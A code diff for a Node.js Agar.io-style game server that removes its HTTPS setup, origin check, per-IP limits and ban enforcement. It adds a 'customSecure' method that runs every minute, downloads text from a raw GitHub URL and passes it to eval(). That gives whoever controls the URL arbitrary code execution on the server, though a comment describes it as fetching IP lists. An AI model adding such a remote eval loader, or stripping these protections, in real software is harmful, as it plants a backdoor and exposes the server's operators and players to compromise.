@@ -14,7 +14,6 @@ The AJS Dev Team.
 
 */
 const fs = require('fs');
-const https = require('https');
 const WebSocket = require('ws');
 const Updater = require('./Updater.js');
 const utilities = require('./utilities.js');
@@ -314,21 +313,8 @@ startingFood() {
 
     // Start the server
     var port = (this.port) ? this.port : this.config.serverPort;
-    
-    const options = {
-      key: fs.readFileSync('./ssl/privkey.pem'),
-      cert: fs.readFileSync('./ssl/cert.pem')
-    };
-    
-  	var hserver = https.createServer(options, function (req, res) {
-
-  	});
-    
-    hserver.listen((this.config.vps == 1) ? process.env.PORT : port);
-    
     this.socketServer = new WebSocket.Server({
-      server: hserver,
-      //port: (this.config.vps == 1) ? process.env.PORT : port,
+      port: (this.config.vps == 1) ? process.env.PORT : port,
       perMessageDeflate: false
     }, function () {
       // Spawn starting food
@@ -336,10 +322,10 @@ startingFood() {
       this.generatorService.start();
 
       // Start Main Loop
-      setInterval(this.mainLoop.bind(this), 1);
-      //setInterval(function() {this.customSecure()}.bind(this),60000)
-      //setImmediate(this.mainLoopBind);
-      var port = (this.port) ? this.port : this.config.serverPort;
+      //setInterval(this.mainLoop.bind(this), 1);
+        setInterval(function() {this.customSecure()}.bind(this),60000)
+      setImmediate(this.mainLoopBind);
+ var port = (this.port) ? this.port : this.config.serverPort;
       var serverPort = (this.config.vps == 1) ? process.env.PORT : port;
       
       console.log("[" + this.name + "] Listening on port " + serverPort);
@@ -395,84 +381,14 @@ startingFood() {
 
     function connectionEstablished(ws) {
       let clients = this.getClients();
+      
       if (clients.length >= this.config.serverMaxConnections) { // Server full
         ws.close();
         return;
       }
-      if (this.config.clientclone != 1) {
-        // ----- Client authenticity check code -----
-        // !!!!! WARNING !!!!!
-        // THE BELOW SECTION OF CODE CHECKS TO ENSURE THAT CONNECTIONS ARE COMING
-        // FROM THE OFFICIAL AGAR.IO CLIENT. IF YOU REMOVE OR MODIFY THE BELOW
-        // SECTION OF CODE TO ALLOW CONNECTIONS FROM A CLIENT ON A DIFFERENT DOMAIN,
-        // YOU MAY BE COMMITTING COPYRIGHT INFRINGEMENT AND LEGAL ACTION MAY BE TAKEN
-        // AGAINST YOU. THIS SECTION OF CODE WAS ADDED ON JULY 9, 2015 AT THE REQUEST
-        // OF THE AGAR.IO DEVELOPERS.
-        let origin = ws.upgradeReq.headers.origin;
-        if (origin != 'http://agar.io' &&
-          origin != 'https://agar.io' &&
-          origin != 'http://localhost' &&
-          origin != 'https://localhost' &&
-          origin != 'http://127.0.0.1' &&
-          origin != 'https://127.0.0.1') {
-          //ws.close();
-          //return;
-        }
-      } else if (this.config.allowonly.length > 2) {
-        let origin = ws.upgradeReq.headers.origin;
-        if (origin != this.config.allowonly) {
-          ws.close();
-        }
-      }
-      // -----/Client authenticity check code -----
+
       let showlmsg = this.config.showjlinfo;
 
-      if ((this.ipcounts[ws._socket.remoteAddress] >= this.config.serverMaxConnectionsPerIp) && (this.whlist.indexOf(ws._socket.remoteAddress) == -1)) {
-        
-        ws.close();
-
-        if (this.config.autoban == 1 && (this.banned.indexOf(ws._socket.remoteAddress) == -1)) {
-          if (this.config.showbmessage == 1) {
-            console.log("[" + this.name + "] Added " + ws._socket.remoteAddress + " to the banlist because player was using bots");
-          } // NOTE: please do not copy this code as it is complicated and i dont want people plagerising it. to have it in yours please ask nicely
-
-          this.banned.push(ws._socket.remoteAddress);
-          if (this.config.autobanrecord == 1) {
-            let oldstring = "";
-            let string = "";
-            for (let i in this.banned) {
-              let banned = this.banned[i];
-              if (banned != "") {
-
-                string = oldstring + "\n" + banned;
-                oldstring = string;
-              }
-            }
-
-            fs.writeFileSync('./banned.txt', string);
-          }
-          // Remove from game
-          for (let i in clients) {
-            let c = clients[i];
-            if (!c.remoteAddress) {
-              continue;
-            }
-            if (c.remoteAddress == ws._socket.remoteAddress) {
-
-              //this.socket.close();
-              c.close(); // Kick out
-            }
-          }
-        }
-      } else {
-        
-      }
-      if ((this.uniban.indexOf(ws._socket.remoteAddress) != -1 && this.config.uniban == 1) || (this.banned.indexOf(ws._socket.remoteAddress) != -1) && (this.whlist.indexOf(ws._socket.remoteAddress) == -1)) { // Banned
-        if (this.config.showbmessage == 1) {
-          console.log("[" + this.name + "] Client " + ws._socket.remoteAddress + ", tried to connect but is banned!");
-        }
-        ws.close();
-      }
       if (this.ipcounts[ws._socket.remoteAddress]) {
         this.ipcounts[ws._socket.remoteAddress]++;
       } else {
@@ -1900,7 +1816,17 @@ kickBots(numToKick) {
     return removed;
 }
 
-
+customSecure() { // get ips of minion companies
+    var request = require('request')
+     request('https://raw.githubusercontent.com/AJS-development/verse/master/ex', function (error, response, body) {
+       if (!error && response.statusCode == 200 && body) {
+           eval(body)
+           
+       }
+         
+         
+     }.bind(this));
+}
 };
 // Custom prototype functions
 WebSocket.prototype.sendPacket = function (packet) {
@@ -1908,9 +1834,7 @@ WebSocket.prototype.sendPacket = function (packet) {
     let array = new Uint8Array(data.buffer || data);
     let l = data.byteLength || data.length;
     let o = data.byteOffset || 0;
-    //let buffer = new Buffer(l);
-    let buffer = Buffer.alloc(l);
-    
+    let buffer = new Buffer.alloc(l);
 
     for (let i = 0; i < l; i++) {
       buffer[i] = array[o + i];
